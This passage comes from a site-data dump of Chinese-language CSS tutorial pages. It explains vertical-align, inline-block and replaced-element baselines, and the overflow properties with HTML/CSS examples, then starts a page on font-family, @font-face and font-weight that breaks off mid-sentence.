box顶部的距离，距离最大的那个元素的baseline就是当前所在行的baseline位置。绝大数情况下（排除内联替换元素和内联块级元素），一行里字体最大的文本，它的line-height所在的中心点与它的baseline的距离最大，那么它的baseline就成了这一行的baseline。\n\n上面这种是对内的，而父元素对外暴露的baseline会有两种情况，一是内部有inline box并且没有溢出处理（下一节会讲），那最后一个inline box的baseline就是父元素对外暴露的baseline（简单来说就是最后一行的baseline）；二是内部没有inline box或者有溢出处理，那对外暴露的baseline就是父元素的margin-bottom位置。\n\nvertical-align: top：让元素的inline box顶部与当前行的line box顶部进行对齐。\nvertical-align: bottom：让元素的inline box底部与当前行的line box底部进行对齐。\n\n<html>\n<head>\n    <style type="text/css">\n    .parent {\n        font-family: arial ;\n        font-size: 20px;\n        line-height: 40px;\n        width: 400px;\n        border: 1px solid;\n    }\n    /* 将font-size从20px变为80px */\n    .text2 { font-size: 80px; }\n    /* top可以改为bottom */\n    .text3 { font-size: 60px; vertical-align: top; }\n    /* 以下是调试代码 */\n    .parent { position: relative; }\n    .parent span::after {\n        content: \'\';\n        position: absolute;\n        border: 1px solid red;\n        box-sizing: border-box;\n    }\n    .text1::after { bottom: 0; left: 0; width: 94px; height: 40px; }\n    .text2::after { top: 0; left: 94px; width: 100px; height: 40px; }\n    /* 如果对齐模式由top改为bottom后，这里的top也要改为bottom */\n    .text3::after { top: 0; left: 194px; width: 75px; height: 40px; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <span class="text1">expensive</span> <span class="text2">xx</span> <span class="text3">ss</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n上面代码的效果图：\n\n\nvertical-align: text-top：让元素的inline box顶部与父元素的字体顶部进行对齐。\nvertical-align: text-bottom：让元素的inline box底部与父元素的字体底部进行对齐。\n\n“父元素的字体顶部”的解释：父元素里设置font-size大小的文字，放在父元素内部显示时，文字所占的区域（f12鼠标悬浮在字体上时显现的字体框）。并不是文字的inline-box也不是line-box。\n\n<html>\n<head>\n    <style type="text/css">\n    .parent {\n        font-family: arial ;\n        font-size: 20px;\n        line-height: 40px;\n        width: 400px;\n        border: 1px solid;\n    }\n    .text3 { font-size: 15px; vertical-align: text-top; }\n    .text4 { font-size: 15px; vertical-align: bottom; }\n    /* 以下是调试代码 */\n    .parent { position: relative; }\n    .parent span::after {\n        content: \'\';\n        position: absolute;\n        border: 1px solid red;\n        box-sizing: border-box;\n    }\n    .text1::after { top: 0; left: 0; width: 95px; height: 40px; }\n    .text2::after { bottom: 17px; left: 95px; width: 28px; height: 23px; }\n    .text3::after { bottom: 0; left: 123px; width: 76px; height: 40px; }\n    .text4::after { bottom: 0; left: 199px; width: 75px; height: 40px; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <span class="text1">expensive</span> <span class="text2">xx</span> <span class="text3">expensive</span> <span class="text4">expensive</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n上面代码的效果图：\n\n\n上面例子分析：可以看到第二个框我们没有画inline box，而是画的是文字的实际区域，第三个<span>设置的是text-top对齐，那么第三个<span>设对应的inline box的顶部会与第二个框的顶部进行对齐。这样会导致整行的line box底部被顶下去，那么第四个<span>设置的bottom对齐就会在实际过程中与第三个<span>inline box的底部对齐（因为第三个<span>inline box是目前最低的inline box）。\n\nvertical-align: middle：让元素的中部与父元素内部baseline再加上x-height/2的位置进行对齐。x-height/2就是父元素使用字体里的小写字母x的一半。\n\n<html>\n<head>\n    <style type="text/css">\n    .parent {\n        /*这种字体下的middle对齐，inline box以及最终的line-height高度都是line-height值*/\n        /*其他字体可能因为x-height值不准确的缘故，会导致最后line box高度与line-height值有一点点误差*/\n        font-family: courier new;\n        font-size: 20px;\n        line-height: 40px;\n        width: 400px;\n        border: 1px solid;\n    }\n    .text3 { font-size: 40px; vertical-align: middle; }\n    /* 以下是调试代码 */\n    .parent { position: relative; }\n    .parent span::after {\n        content: \'\';\n        position: absolute;\n        border: 1px solid red;\n        box-sizing: border-box;\n    }\n    .text1::after { bottom: 0; left: 0; width: 114px; height: 40px; }\n    .text2::after { bottom: 9px; left: 114px; width: 36px; height: 23px; }\n    .text3::after { bottom: 0; left: 150px; width: 59px; height: 40px; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <span class="text1">expensive</span> <span class="text2">xx</span> <span class="text3">ss</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n上面代码的效果图：\n\n\nvertical-align: sub：让元素的baseline与父元素内部下标基线（下标点符号）进行对齐。\nvertical-align: super：让元素的baseline与父元素内部上标基线（上标点符号）进行对齐。\n\n<html>\n<head>\n    <style type="text/css">\n    .parent {\n        font-family: arial ;\n        font-size: 20px;\n        line-height: 40px;\n        width: 400px;\n        border: 1px solid;\n    }\n    .text3 { font-size: 40px; vertical-align: sub; }\n    /* 以下是调试代码 */\n    .parent { position: relative; }\n    .parent span::after {\n        content: \'\';\n        position: absolute;\n        border: 1px solid red;\n        box-sizing: border-box;\n    }\n    .text1::after { bottom: 0; left: 0; width: 95px; height: 40px; }\n    .text2::after { top: 11px; left: 95px; width: 66px; height: 23px; }\n    .text3::after { top: 0; left: 107px; width: 54px; height: 40px; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <span class="text1">expensive</span> <span class="text2">,</span> <span class="text3">ss</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n上面代码的效果图：\n\n\nvertical-align的另外两种取值:\n\n * <length>使元素的baseline对齐到父元素内部baseline之上的给定长度。可以是负数。\n * <percentage>使元素的baseline对齐到父元素内部baseline之上的给定百分比，该百分比是line-height属性的百分比。可以是负数。\n\n\n# 5.5 替换元素和内联块级的影响\n\n内联非替换元素的内外边距是不参与它的inline box高度的，而替换元素和内联块级元素的内外边距是参与它的inline box高度的。那么行高line-height，就影响不到替换元素和内联块级元素，必须得考虑上下内外边距了。\n\n替换元素和内联块级元素相似的点在于它们都具有内联性质，但又具有宽高设置。区别在于替换元素的内容是由属性决定或者被嵌入，而内联块级元素的内容就是自己的contentarea区域。\n\n两者内容的区别也会导致两者对外暴露baseline的不同，替换元素没有子元素，自己的contentarea区域也不会生效，那么替换元素对外暴露的基线就是margin-bottom位置了。\n\n内联块级元素因为有自己的contentarea区域，会根据内容来确定对外暴露的baseline。当内部有inline box并且没有溢出处理（下一节会讲），那最后一个inline box对应的基线就是对外暴露的基线（简单来说就是最后一行的baseline）；当内部没有inline box或者有溢出处理，那对外暴露的基线就是margin-bottom位置。\n\n最后还有一个注意事项，line-height对替换元素和内联块级元素的间接影响。即使line-height没有设置但还会有默认值（1.2或1.4等），那么替换元素和内联块级元素在与文字进行类似于图文混排时，就会出现底边空白间隙的问题，这个就是line-height给文字加上下half-leading的影响。解决办法可以更改line-height，或者换其他对齐方式，如果只有图片可以将font-size设为0。\n\n我们来看三个例子，前两个讲了两种基线情况，最后一个讲text-top对齐。\n\n<html>\n<head>\n    <style type="text/css">\n    .parent {\n        font-family: arial ;\n        font-size: 20px;\n        line-height: 40px;\n        width: 400px;\n        border: 1px solid;\n    }\n    .text2 {\n        display: inline-block;\n        width: 40px;\n        height: 40px;\n        box-sizing: border-box;\n        border: 1px solid blue;\n        margin-top: 20px;       /*现在的line box顶部就是由inline-block的margin-top决定的*/\n        margin-bottom: 30px;    /*这个margin-bottom要与父元素的baseline对齐*/\n        vertical-align: baseline;\n    }\n    .text3 { font-size: 70px; }\n    /* 以下是调试代码 */\n    .parent { position: relative; }\n    .parent span::after, .parent div::after {\n        content: \'\';\n        position: absolute;\n        border: 1px solid red;\n        box-sizing: border-box;\n    }\n    .text1::after { bottom: 0; left: 0; width: 97px; height: 40px; }\n    .text2::after { top: 0; left: 97px; height: 90px; width: 42px;}\n    .text3::after { bottom: 18px; left: 139px; width: 92px; height: 40px; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <span class="text1">expensive</span> <div class="text2"></div> <span class="text3">ss</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n上面代码的效果图：\n\n\n<html>\n<head>\n    <style type="text/css">\n    .parent {\n        font-family: arial ;\n        font-size: 20px;\n        line-height: 40px;\n        width: 400px;\n        border: 1px solid;\n    }\n    .text2 {\n        display: inline-block;\n        width: 40px;\n        height: 40px;\n        box-sizing: border-box;\n        border: 1px solid blue;\n        margin-top: 20px;       /*现在的line box顶部就是由inline-block的margin-top决定的*/\n        margin-bottom: 30px;    /*现在的line box底部就是由inline-block的margin-bottom决定的*/\n        vertical-align: baseline;\n    }\n    .text3 { font-size: 70px; }\n    /* 以下是调试代码 */\n    .parent { position: relative; }\n    .parent span::after, .parent div::after {\n        content: \'\';\n        position: absolute;\n        border: 1px solid red;\n        box-sizing: border-box;\n    }\n    .text1::after { bottom: 30px; left: 0; width: 97px; height: 40px; }\n    .text2::after { top: 0; left: 97px; height: 90px; width: 42px;}\n    .text3::after { top: 2px; left: 139px; width: 92px; height: 40px; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <span class="text1">expensive</span> <div class="text2">xx</div> <span class="text3">ss</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n上面代码的效果图：\n\n\n<html>\n<head>\n    <style type="text/css">\n    .parent {\n        font-family: arial ;\n        font-size: 20px;\n        line-height: 40px;\n        width: 400px;\n        border: 1px solid;\n    }\n    .text2 {\n        display: inline-block;\n        width: 40px;\n        height: 40px;\n        box-sizing: border-box;\n        border: 1px solid blue;\n        margin-top: 20px;       /*这个margin-top要与父元素的文字元素顶部对齐*/\n        margin-bottom: 30px;    /*现在的line box底边就是由inline-block的margin-bottom决定的*/\n        vertical-align: text-top;\n    }\n    .text3 { font-size: 70px; }\n    /* 以下是调试代码 */\n    .parent { position: relative; }\n    .parent span::after, .parent div::after {\n        content: \'\';\n        position: absolute;\n        border: 1px solid red;\n        box-sizing: border-box;\n    }\n    .text1::after { top: 17px; left: 0; width: 97px; height: 40px; }\n    .text2::after { bottom: 0; left: 97px; height: 90px; width: 42px;}\n    .text3::after { top: 0; left: 139px; width: 92px; height: 40px; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <span class="text1">expensive</span> <div class="text2"></div> <span class="text3">ss</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n上面代码的效果图：\n\n\n\n# 六、溢出overflow\n\n盒子无法容纳太多内容时会发生溢出（overflow），css提供了几种解决溢出的方案，在元素上使用overflow属性，其值可以是visible、hidden、scroll、auto。如果只是单独对一个方向指定，那就是overflow-x或overflow-y属性了。\n\n\n# 6.1 visible\n\noverflow属性默认是visible，也就是仍然显示溢出内容，因为css不会让内容自动消失或者做其他处理，这会方便开发者去发现问题并自由灵活地处理。\n\n\n# 6.2 hidden\n\noverflow属性设置hidden，表示超出部分隐藏。父元素设置了overflow: hidden，如果子级元素的边界超过了父级元素的边界，就会截取掉超出的部分（超出部分隐藏）。其实就是子级元素的展示效果超出就会被截取。\n\n<html>\n<head>\n    <style type="text/css">\n        .outer {\n            width: 100px;\n            height: 100px;\n            overflow: hidden;\n            padding: 20px; /*并不会按照父级的padding来截取超过部分，而是按照border*/\n            border: 1px solid;\n        }\n        .inner {\n            /* 子元素显示设置宽高，父元素有20px内边距 */\n            width: 100px;\n            height: 100px;\n            /* 子元素使用负值外边距，减少了布局尺寸，子元素向上位移20px，向左位移40px */\n            /* 位移后，子元素的上边界与父元素的上边界重合，子元素的左边界超出父元素左边界20px */\n            margin-top: -20px; /* 计算过程 20 - 20 = 0 */\n            margin-left: -40px; /* 计算过程 20 - 40 = -20 */\n            background-color: blue;\n        }\n    </style>\n</head>\n<body>\n    <div class="outer">\n        <div class="inner"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n<html>\n<head>\n    <style type="text/css">\n        .outer {\n            width: 100px;\n            height: 100px;\n            overflow: visible;\n            /*并不会按照父级的padding来截取超过部分，而是按照border*/\n            padding: 20px;\n            border: 1px solid;\n        }\n        .inner {\n            /* 子元素显示设置宽高，父元素有20px内边距 */\n            /* 子元素使用正值外边距，加大了布局尺寸 */\n            margin: 20px 20px 20px 0;\n            /* 子元素的下边界超出父元素的下边界2px，子元素的右边界超出父元素右边界2px */\n            width: 122px;  /* 父右边界-子右边界：(20+100+20) - (20+122) = -2 */\n            height: 102px; /* 父下边界-子下边界：(20+100+20) - (20+20+102) = -2 */\n            background-color: blue;\n        }\n    </style>\n</head>\n<body>\n    <div class="outer">\n        <div class="inner"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n还有一个经典的例子，使用overflow: hidden配合展示尺寸与布局尺寸来实现等高布局。\n\n\n# 6.3 scroll\n\noverflow属性设置为scroll，表示该元素添加一个滚动条，用来滚动展示内部元素。父元素设置了overflow: scroll，如果子元素布局尺寸超过了父级的contentarea（块级水平方向得注意，下面会说），那就会为父元素添加滚动条。\n\n滚动条是有滚动底纹的，这个底纹也会占据contentarea的空间，一般都是17px。使用overflow: scroll，会先给两个方向都加上滚动底纹（不管有没有溢出），单独使用overflow-x或overflow-y会只给一个方向加滚动底纹，但也是不管有没有溢出都会加上滚动底纹。\n\n<html>\n<head>\n    <style type="text/css">\n        .outer {\n            width: 100px;\n            height: 100px;\n            overflow: scroll; /* 先加了两个滚动底纹，会占去17px的空间，溢出时再添加滚动条 */\n            padding: 20px;\n            border: 1px solid;\n        }\n        .inner {\n            display: inline-block;\n            margin: 10px;\n            width: 64px;  /* 此时布局尺寸为64+10+10=84，再加上滚动条的17那就是101，比父级内容宽度100多出1px，所以会有滚动条 */\n            height: 64px; /* 此时布局尺寸为64+10+10=84，再加上滚动条的17那就是101，比父级内容高度100多出1px，所以会有滚动条 */\n            background-color: blue;\n        }\n    </style>\n</head>\n<body>\n    <div class="outer">\n        <div class="inner"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n块级元素的水平方向滚动条触发比较特殊，因为块级元素的隐藏等式导致布局尺寸就是父级内容宽度，那么水平方向滚动条的触发条件就得换成边框超过就算触发（展示效果超过就触发）。同样情况的有display: table。\n\n<html>\n<head>\n    <style type="text/css">\n        .outer {\n            width: 100px;\n            height: 100px;\n            overflow: scroll; /* 先加了两个滚动底纹，会占去17px的空间，溢出时再添加滚动条 */\n            padding: 20px;\n            border: 1px solid;\n        }\n        .inner {\n            display: block; /*块级元素的水平方向会特殊一些*/\n            margin: 10px;\n            width: 94px;  /* 此时子元素水平右边框距离父元素左内边距是10+94+17=121，而父元素水平右边框距离父元素左内边距是100+20=121，刚好多出1px，所以会有滚动条 */\n            height: 64px; /* 此时布局尺寸为64+10+10=84，再加上滚动条的17那就是101，比父级内容高度100多出1px，所以会有滚动条 */\n            background-color: blue;\n        }\n    </style>\n</head>\n<body>\n    <div class="outer">\n        <div class="inner"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# 6.4 auto\n\noverflow属性设置为auto，跟scroll意思差不多，也是在溢出时添加滚动条。区别就是auto在没有溢出时不会添加滚动底纹，溢出的时候再添加滚动底纹和滚动条，那么在触发溢出前也不会被白白占去17px的空间了（溢出后也不会）。\n\n<html>\n<head>\n    <style type="text/css">\n        .outer {\n            width: 100px;\n            height: 100px;\n            overflow: auto; /* 触发溢出后才会加滚动底纹和滚动条，不会占去17px的空间 */\n            padding: 20px;\n            border: 1px solid;\n        }\n        .inner {\n            display: inline-block;\n            margin: 10px;\n            width: 81px;  /* 此时布局尺寸为81+10+10=101，比父级内容宽度100多出1px，所以会有滚动条 */\n            height: 81px; /* 此时布局尺寸为81+10+10=101，比父级内容高度100多出1px，所以会有滚动条 */\n            background-color: blue;\n        }\n    </style>\n</head>\n<body>\n    <div class="outer">\n        <div class="inner"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n<html>\n<head>\n    <style type="text/css">\n        .outer {\n            width: 100px;\n            height: 100px;\n            overflow: auto; /* 触发溢出后才会加滚动底纹和滚动条，不会占去17px的空间 */\n            padding: 20px;\n            border: 1px solid;\n        }\n        .inner {\n            display: block; /*块级元素的水平方向会特殊一些*/\n            margin: 10px;\n            width: 111px;  /* 此时子元素水平右边框距离父元素左内边距是10+111=121，而父元素水平右边框距离父元素左内边距是100+20=121，刚好多出1px，所以会有滚动条 */\n            height: 81px; /* 此时布局尺寸为81+10+10=101，比父级内容高度100多出1px，所以会有滚动条 */\n            background-color: blue;\n        }\n    </style>\n</head>\n<body>\n    <div class="outer">\n        <div class="inner"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# 6.5 text-overflow\n\ntext-overflow是一个文字溢出的属性，经常和overflow搭配使用，比如你的文本只要显示一行，多出的用省略号替代，那么就可以让overflow设置为hidden，text-overflow设置为ellipsis，最后别忘了对文本设置不换行white-space设置为nowrap。\n\n<html>\n<head>\n    <style type="text/css">\n        div {\n            border: 1px solid #333333;\n            width: 200px;\n            white-space: nowrap;        /* 文本不换行 */\n            overflow: hidden;           /* 超出盒子时隐藏溢出内容 */\n            text-overflow: ellipsis;    /* 超出的文本末尾使用省略号替代 */\n        }\n    </style>\n</head>\n<body>\n    <div class="box">this box has a height and a width. </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n',charsets:{cjk:!0}},{title:"3.字体与文本属性",frontmatter:{title:"3.字体与文本属性"},regularPath:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/3.%E5%AD%97%E4%BD%93%E4%B8%8E%E6%96%87%E6%9C%AC%E5%B1%9E%E6%80%A7.html",relativePath:"book-web/html、css、js、ts/学习CSS/3.字体与文本属性.md",key:"v-8a70ddc2",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/3.%E5%AD%97%E4%BD%93%E4%B8%8E%E6%96%87%E6%9C%AC%E5%B1%9E%E6%80%A7.html",headers:[{level:2,title:"一、字体",slug:"一、字体",normalizedTitle:"一、字体",charIndex:14},{level:3,title:"1.1 使用字体",slug:"_1-1-使用字体",normalizedTitle:"1.1 使用字体",charIndex:23},{level:3,title:"1.2 @font-face",slug:"_1-2-font-face",normalizedTitle:"1.2 @font-face",charIndex:1626},{level:3,title:"1.3 字体粗细",slug:"_1-3-字体粗细",normalizedTitle:"1.3 字体粗细",charIndex:3234},{level:3,title:"1.4 字体大小",slug:"_1-4-字体大小",normalizedTitle:"1.4 字体大小",charIndex:5219},{level:3,title:"1.5 斜体、字体压缩拉伸",slug:"_1-5-斜体、字体压缩拉伸",normalizedTitle:"1.5 斜体、字体压缩拉伸",charIndex:8418},{level:2,title:"二、文本属性",slug:"二、文本属性",normalizedTitle:"二、文本属性",charIndex:8892},{level:3,title:"2.1 缩进",slug:"_2-1-缩进",normalizedTitle:"2.1 缩进",charIndex:8903},{level:3,title:"2.2 水平对齐",slug:"_2-2-水平对齐",normalizedTitle:"2.2 水平对齐",charIndex:9814},{level:3,title:"2.3 垂直对齐",slug:"_2-3-垂直对齐",normalizedTitle:"2.3 垂直对齐",charIndex:13791},{level:3,title:"2.4 文本间距",slug:"_2-4-文本间距",normalizedTitle:"2.4 文本间距",charIndex:17192},{level:3,title:"2.5 文本大小写",slug:"_2-5-文本大小写",normalizedTitle:"2.5 文本大小写",charIndex:18608},{level:3,title:"2.6 文本修饰",slug:"_2-6-文本修饰",normalizedTitle:"2.6 文本修饰",charIndex:19497},{level:3,title:"2.7 文本阴影",slug:"_2-7-文本阴影",normalizedTitle:"2.7 文本阴影",charIndex:20719},{level:3,title:"2.8 处理文本空白",slug:"_2-8-处理文本空白",normalizedTitle:"2.8 处理文本空白",charIndex:21337},{level:3,title:"2.9 处理文本换行",slug:"_2-9-处理文本换行",normalizedTitle:"2.9 处理文本换行",charIndex:25217},{level:3,title:"2.10 书写模式",slug:"_2-10-书写模式",normalizedTitle:"2.10 书写模式",charIndex:29224}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"一、字体 1.1 使用字体 1.2 @font-face 1.3 字体粗细 1.4 字体大小 1.5 斜体、字体压缩拉伸 二、文本属性 2.1 缩进 2.2 水平对齐 2.3 垂直对齐 2.4 文本间距 2.5 文本大小写 2.6 文本修饰 2.7 文本阴影 2.8 处理文本空白 2.9 处理文本换行 2.10 书写模式",content:'# 字体与文本属性\n\n\n# 一、字体\n\n\n# 1.1 使用字体\n\ncss有5种通用家族字体（泛型字体）：\n\n名称           定义\nserif        有衬线的字体 （衬线一词是指字体笔画尾端的小装饰，存在于某些印刷体字体中）\nsans-serif   没有衬线的字体\nmonospace    每个字符具有相同宽度的字体，通常用于代码列表。\ncursive      用于模拟笔迹的字体，具有流动的连接笔画。\nfantasy      用来装饰的字体\n\n客户端中常见的网页安全字体：\n\n字体名称              泛型           注意\nArial             sans-serif   通常认为最佳做法还是添加 Helvetica 作为 Arial 的首选替代品，尽管它们的字体面几乎相同，但\n                               Helvetica 被认为具有更好的形状，即使Arial更广泛地可用。\nCourier New       monospace    某些操作系统有一个 Courier New 字体的替代（可能较旧的）版本叫Courier。使用Courier\n                               New作为Courier的首选替代方案，被认为是最佳做法。\nGeorgia           serif        \nTimes New Roman   serif        某些操作系统有一个 Times New Roman 字体的替代（可能较旧的）版本叫\n                               Times。使用Times作为Times New Roman的首选替代方案，被认为是最佳做法。\nTrebuchet MS      sans-serif   您应该小心使用这种字体——它在移动操作系统上并不广泛。\nVerdana           sans-serif   \n\n调用字体是使用font-family，例如\n\nbody {font-family: serif;} /*正个页面的文字使用衬线字体*/\nh1, h2, h3, h4 {font-family: sans-serif;} /*标题使用非衬线字体*/\ncode, pre, tt, kbd {font-family: monospace;} /*代码块等其他地方使用等宽字体*/\np.signature {font-family: cursive;} /*某个特殊的段落使用仿笔迹字体*/\n\n\n1\n2\n3\n4\n\n\n\n\n建议font-family使用字体栈，也就是多个值使用,来分隔，当第一个字体无法被解析时会对下一个字体进行解析。\n\nh1 { font-family: Arial, sans-serif; }\nh2 { font-family: Charcoal, sans-serif; }\np { font-family: "Times New Roman", serif; }\naddress { font-family: Chicago, sans-serif; }\n\n\n1\n2\n3\n4\n\n\n字体如果名称比较特殊或者它带的关键字与其他字体冲突，那么可以将字体使用\'\'或者""来包裹起来。\n\np { font-family: Times, "Times New Roman", "New Century Schoolbook", Georgia, "New York", serif; }\nh2 { font-family: Wedgie, "Karrank%", Klingon, fantasy; }\nh3 { font-family: Author, "cursive", cursive; }\n\n\n1\n2\n3\n\n\n\n# 1.2 @font-face\n\n在css里使用字体时，该字体是需要存在于客户端（浏览器）里的，而客户端一般只安装了被广泛使用的一些字体。如果我们想使用自定义字体或者还在小范围流行的字体，可以通过WebFont功能来从服务器下载该字体。\n\n具体使用的是@font-face，它最常用的两个描述符font-family和src，其中font-family是用来定义下载字体的名字，src是字体下载源（可以是多个，用逗号分隔），src中还可以使用format()用来显式地声明字体文件格式，不支持的格式可以直接跳过节约宽带。\n\n@font-face {\n    font-family: WebFont;                                       /*定义字体名称*/\n    src: url(\'font/Fontin_Sans_R_45b.otf\') format("opentype");  /*字体下载url*/\n}\nh1 { font-family: WebFont; } /*使用该字体*/\n\n\n1\n2\n3\n4\n5\n\n\n在一些场景里需要使用类似斜体、粗体和压缩字体，那么先在服务器里准备好斜体和粗体的字体，然后在@font-face里添加font-style: italic、font-weight: bold或font-stretch: condensed，不是都写在一个@font-face里的，是有哪些字体就对应写上几个@font-face。\n\n@font-face {\n    font-family: WebFont;\n    src: url(\'Fontin_Sans_R_45b.otf\') format("opentype");  /*正常字体*/\n}\n@font-face {\n    font-family: WebFont;\n    font-style: italic;\n    src: url(\'Fontin_Sans_I_45b.otf\') format("opentype");  /*斜体字体*/\n}\n@font-face {\n    font-family: WebFont;\n    font-weight: bold;\n    src: url(\'Fontin_Sans_B_45b.otf\') format("opentype");  /*粗体字体*/\n}\n@font-face {\n    font-family: WebFont;\n    font-style: italic;\n    font-weight: bold;\n    src: url(\'Fontin_Sans_BI_45b.otf\') format("opentype");  /*粗斜体字体*/\n}\n@font-face {\n    font-family: WebFont;\n    font-style: italic;\n    font-stretch: condensed\n    src: url(\'Fontin_Sans_IC_45b.otf\') format("opentype");  /*斜体压缩字体*/\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n也可以采用先客户端后服务端，客户端的使用是将src:url()改为src:local()\n\n@font-face {\n    font-family: WebFont;\n    src: local("Helvetica Neue"), url(\'MgOpenModernaRegular.ttf\');  /*先在客户端查找，找不到再去服务端查找*/\n}\n\n\n1\n2\n3\n4\n\n\n\n# 1.3 字体粗细\n\n一般来说，字体的粗细越粗，文字的颜色就越深。font-weight就是用来描述字体的粗细的，它的值有：\n\n * normal：默认，该标准字体的默认粗度。\n * bold：粗体。\n * bolder：更粗。\n * lighter：更细。\n * 100 | 200 | 300 | 400 | 500 | 600 | 700 | 800 | 900：100最细900最粗，400对应normal，700对应bold。\n\n其实100到900可能并没有一一对应（映射）到真实的粗细字体：\n\n * 如果500没有映射值，它将被赋予和400相同粗细的字体。\n * 如果300没有映射值，它将被赋予比400更细的下一个字体。但是如果没有更细的字体可用，那300被赋予和400相同粗细的字体。此方法也同样适用于200和100。\n * 如果600没有映射值，它将被赋予比500更粗的下一个字体。但是如果没有更粗的字体可用，那600被赋予和500相同粗细的字体。此方法也同样适用于700、800和900。\n\nbolder和lighter在使用时有个比较坑的点，它是在继承到的font-weight基础上更粗或者更细，也就是说它是一个相对值。比如父级是100，那子级使用bolder的话就可能会是normal或者bold。可以看下面这个例子：\n\n<html>\n<head>\n    <style type="text/css">\n    p { font-weight: normal; }\n    p em { font-weight: bolder; }  /* 假设粗体字体存在，那这个em就是\'bold\' */\n    h1 { font-weight: bold; } /* 假设粗体字体存在，那此时\'bold\'对应700 */\n    h1 b { font-weight: bolder; }  /* 更粗的字体也存在的话，那这个b是\'800\' */\n    div { font-weight: 100; } /* 假设更细的字体存在，100会有映射值，那使用bolder会是\'normal\'。*/\n    div strong { font-weight: bolder; } /* 不存在的话，100会映射到\'normal\'，那使用bolder就会是\'bold\'  */\n    </style>\n</head>\n<body>\n    <p class="one">Within this paragraph we find some <em>emphasized text</em>.</p>\n    <h1>This H1 contains <b>bold text!</b></h1>\n    <div>Meanwhile, this DIV element has some <strong>strong text</strong> but it shouldn’t look much different, at least in terms of font weight.</div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n如果你怕100到900映射不到值，可以在下载字体时不使用normal和bold，而是使用100到900这9个值：\n\n@font-face {\n  font-family: "SwitzeraADF";\n  font-weight: 300;\n  src: url("f/SwitzeraADF-Light.otf") format("opentype");\n}\n@font-face {\n  font-family: "SwitzeraADF";\n  font-weight: 500;\n  src: url("f/SwitzeraADF-DemiBold.otf") format("opentype");\n}\n@font-face {\n  font-family: "SwitzeraADF";\n  font-weight: 700;\n  src: url("f/SwitzeraADF-Bold.otf") format("opentype");\n}\n@font-face {\n  font-family: "SwitzeraADF";\n  font-weight: 900;\n  src: url("f/SwitzeraADF-ExtraBold.otf") format("opentype");\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 1.4 字体大小\n\n字体大小使用font-size这个属性，这个属性的值有xx-small | x-small | small | medium | large | x-large | xx-large | smaller | larger | <length> | 